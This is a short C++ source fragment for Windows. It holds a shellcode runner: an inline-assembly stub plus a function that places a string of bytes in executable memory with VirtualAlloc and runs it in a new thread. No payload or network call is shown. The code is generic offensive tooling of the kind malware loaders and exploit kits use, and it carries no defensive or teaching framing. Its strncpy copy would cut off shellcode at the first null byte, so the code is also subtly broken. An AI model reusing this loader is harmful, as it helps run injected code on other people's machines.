//ASM STUB TO EXECUTE SHELLCODE
DWORD WINAPI execPayloadStub(LPVOID lpParameter) 
{
	__try 
	{
		__asm 
		{
			mov eax, [lpParameter]
			call eax

			push 0
			call ExitThread
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER) 
	{
		return 1;
	}
	return 0;
}


int runShellCode(wstring scCode) 
{
	//CONVERT WIDE STRING TO CHAR
	char *aTmp = new char[scCode.length()+1];
	aTmp[scCode.size()] = '\0';
	WideCharToMultiByte(CP_ACP, 0, scCode.c_str(), -1, aTmp, scCode.length(), NULL, NULL);
	string aCode = aTmp;
	delete[] aTmp;

	string shellCode = aCode.c_str();

	HANDLE shellCodeThread;
	DWORD tid;
	void *shellCodeAddr;
	
	//ALLOCATE MEMORY FOR SHELLCODE
	shellCodeAddr = VirtualAlloc(NULL, shellCode.length(), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(!shellCodeAddr) return 1;
	
	//COPY SHELLCODE 
	strncpy((char *)shellCodeAddr, shellCode.c_str(), aCode.length());

	//CREATE THREAD
	shellCodeThread = CreateThread(NULL, 0, execPayloadStub, shellCodeAddr, 0, &tid);
	
	if(!shellCodeThread) return 1;

	WaitForSingleObject(shellCodeThread, 5000);
	return 0;
}
